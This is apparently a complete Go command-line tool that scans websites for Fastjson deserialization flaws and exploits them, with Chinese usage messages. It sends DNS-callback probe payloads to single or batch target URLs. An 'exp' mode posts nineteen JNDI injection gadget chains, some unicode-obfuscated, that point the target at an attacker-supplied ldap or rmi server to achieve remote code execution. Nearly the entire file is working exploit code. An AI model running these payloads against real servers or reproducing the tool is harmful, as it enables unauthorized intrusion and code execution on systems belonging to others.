package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

var url_list []string
var Prin string

func main() {
	v()
	var dns string
	var ipFile string
	var url string
	var exp bool
	var method string
	var P string
	var cookie string
	flag.StringVar(&ipFile, "f", "", "urls file")
	flag.StringVar(&url, "u", "http://127.0.0.1", "url")
	flag.StringVar(&dns, "dns", "dns.log", "dnslog")
	flag.StringVar(&method, "m", "", "ldap or rmi")
	flag.StringVar(&P, "p", "n", " y or n :打印payload")
	flag.StringVar(&cookie, "c", "", " cookie")
	flag.BoolVar(&exp, "e", true, "EXP")
	flag.Parse()
	start := time.Now()
	if P == "y" {
		Prin = "y"
	}
	if method != "" && exp == true {
		fmt.Println("exp攻击")
		expattack(method, url, dns, cookie)
		os.Exit(0)
	}
	if len(os.Args) == 1 {
		fmt.Println("use: " + os.Args[0] + " " + "-f urlfile -dns dnslog" + "   批量检测")
		fmt.Println("use: " + os.Args[0] + " " + "-u url -dns dnslog" + "   单独url检测")
		fmt.Println("usage: " + os.Args[0] + " " + "-e -u url -m ldap/rmi -dns ip:port " + "   exp攻击")
		os.Exit(0)
	} else if ipFile != "" {
		array := list(ipFile)
		num := len(array) - 1
		for i, v := range array {
			fmt.Println(strconv.Itoa(i) + "/" + strconv.Itoa(num) + "   " + "Cracking: " + v)
			FastjsonScan(v, dns, cookie)
		}
	} else if url != "" {
		fmt.Println("Cracking: " + url)
		FastjsonScan(url, dns, cookie)
	} else {
		fmt.Println("")
		fmt.Println("usage: " + os.Args[0] + " " + "-f urlfile" + " -dns doslog  批量检测")
		fmt.Println("usage: " + os.Args[0] + " " + "-u url" + "   -dns doslog  单独url检测")
		fmt.Println("usage: " + os.Args[0] + " " + "-e y -u url -m ldap/rmi -dns ip:port/xxx " + "   exp攻击")
		os.Exit(0)
	}
	end := time.Now()
	fmt.Println("用时:", end.Sub(start), "秒")
}

func FastjsonScan(url string, dns string, cookie string) {
	ur := strings.Split(url, "//")[1]
	ur1 := strings.Split(ur, "/")[0]
	if strings.Contains(ur1, ":") {
		ur1 = strings.Replace(ur1, ":", ".", -1)
	}
	dns = ur1 + "." + dns
	var poc [11]string
	poc[0] = "{\"@type\":\"java.net.Inet4Address\",\"val\":\"" + dns + "\"}"
	poc[1] = "{\"@type\":\"java.net.Inet6Address\",\"val\":\"" + dns + "\"}"
	poc[2] = "{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"" + dns + "\"}}"
	poc[3] = "{\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"" + dns + "\"}}\"\"}"
	poc[4] = "{{\"@type\":\"java.net.URL\",\"val\":\"" + dns + "\"}:\"aaa\"}"
	poc[5] = "Set[{\"@type\":\"java.net.URL\",\"val\":\"" + dns + "\"}]"
	poc[6] = "Set[{\"@type\":\"java.net.URL\",\"val\":\"" + dns + "\"}"
	poc[7] = "{{\"@type\":\"java.net.URL\",\"val\":\"" + dns + "\"}:0"
	poc[8] = "{\"a\":{\"@type\": \"java.lang.AutoCloseable\", \"@type\":\"java.io.Reader\"},\"rand1\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"" + dns + "\"}}}"
	poc[9] = `{"\u0040t\u0079pe":"\u006a\u0061\u0076\u0061.\u006e\u0065\u0074.\u0049\u006e\u0065\u0074\u0034\u0041\u0064\u0064\u0072\u0065\u0073\u0073\","\u0076\u0061\u006c\":"` + dns + `"}`
	poc[10] = `{"@type":\b"java.net.Inet4Address","val":"` + dns + `"}`

	for _, v := range poc {
		startscan(url, v, cookie)
	}
}

func expattack(method string, url string, dns string, cookie string) {
	poc := method + "://" + dns
	var exp [19]string
	exp[0] = `{"name":{"\u0040\u0074\u0079\u0070\u0065":"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073","\u0076\u0061\u006c":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"},"x":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"` + poc + `","autoCommit":true}}`
	exp[1] = `{   "5300cr": {     "\u0040t\u0079pe": "L\x63\u006F\u006D.su\u006E\x2Ero\u0077\u0073\u0065\u0074\u002EJ\u0064b\x63R\x6F\x77\u0053e\u0074I\x6D\x70l;",     "dataSourceName": "` + poc + `",     "autoCommit": true   } }`
	exp[2] = `{
		"rand1": {
		  "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
		  "properties": {
			"data_source": "` + poc + `"
		  }
		}
	  }`
	exp[3] = `{
		"rand1": {
		  "@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
		  "targetBeanName": "` + poc + `",
		  "propertyPath": "foo",
		  "beanFactory": {
			"@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
			"shareableResources": [
			  "` + poc + `"
			]
		  }
		}
	  }`
	exp[4] = `{
		"rand1": Set[
		{
		  "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",
		  "beanFactory": {
			"@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
			"shareableResources": [
			  "` + poc + `"
			]
		  },
		  "adviceBeanName": "` + poc + `"
		},
		{
		  "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor"
		}
	  ]}`
	exp[5] = `{
		"rand1": {
		  "@type": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
		  "jndiName": "` + poc + `",
		  "loginTimeout": 0
		}
	  }`
	exp[6] = `{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"` + poc + `"}`
	exp[7] = `{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"` + poc + `"}`
	exp[8] = `{"name":{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"` + poc + `","autoCommit":true}}`
	exp[9] = `{"name":{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"` + poc + `","autoCommit":true}}`
	exp[10] = `{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["` + poc + `"], "Realms":[""]}`
	exp[11] = `{"@type":"org.apache.xbean.propertyeditor.JndiConverter","asText":"` + poc + `"}`
	exp[12] = `{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"` + poc + `"}}`
	exp[13] = `{"@type":"org.apache.cocoon.components.slide.impl.JMSContentInterceptor", "parameters": {"@type":"java.util.Hashtable","java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory","topic-factory":"` + poc + `"}, "namespace":""}`
	exp[14] = `{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"` + poc + `"}`
	exp[15] = `{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"` + poc + `","Object":"a"}`
	exp[16] = `[{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"` + poc + `","autoCommit":true}]`
	exp[17] = `{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"` + poc + `"}`
	exp[18] = `{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"` + poc + `"}`
	for _, v := range exp {
		startscan(url, v, cookie)
	}
	fmt.Println("攻击完毕")
}

var i int

func startscan(url string, poc string, cookie string) {
	nu := strconv.Itoa(i)
	var req *http.Request
	post := poc
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	req, _ = http.NewRequest("POST", url, strings.NewReader(post))
	req.Header.Set("Accept", "*/*")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")
	req.Header.Set("Accept-Encoding", "gzip,deflate")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Connection", "close")
	if cookie != "" {
		req.Header.Set("Cookie", cookie)
	}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(url + "-- request fail")
		return
	}
	defer resp.Body.Close()

	responseCode := strconv.Itoa(resp.StatusCode)
	if nu != "" {
		fmt.Println("EXP:" + nu + "   response:" + responseCode)
		fmt.Println(poc)
		i++
	}

}

func list(urlfile string) []string {
	url_file, err := os.Open(urlfile)
	if err != nil {
		fmt.Println("Can't open urlfile")
	}
	defer url_file.Close()
	reader_Url := bufio.NewReader(url_file)
	for {
		url, err := reader_Url.ReadString('\n')
		url = strings.Replace(url, " ", "", -1)
		url = strings.Replace(url, "\n", "", -1)
		url = strings.Replace(url, "\r", "", -1)
		url_list = append(url_list, url)
		if err == io.EOF {
			break
		}
	}
	return url_list
}
func v() {
	fmt.Println("              _                                     _                     _       ")
	fmt.Println("             | |                             _     ( )     _             | |      ")
	fmt.Println("  ____   ____| |__   ___  ____  _____  ___ _| |_   |/    _| |_ ___   ___ | |  ___ ")
	fmt.Println(" |    \\ / ___)  _ \\ / _ \\|  _ \\| ___ |/___|_   _)       (_   _) _ \\ / _ \\| | /___)")
	fmt.Println(" | | | | |   | | | | |_| | | | | ____|___ | | |_          | || |_| | |_| | ||___ |")
	fmt.Println(" |_|_|_|_|   |_| |_|\\___/|_| |_|_____|___/   \\__)          \\__)___/ \\___/ \\_|___/ ")
	fmt.Println("===================================================================================")
}
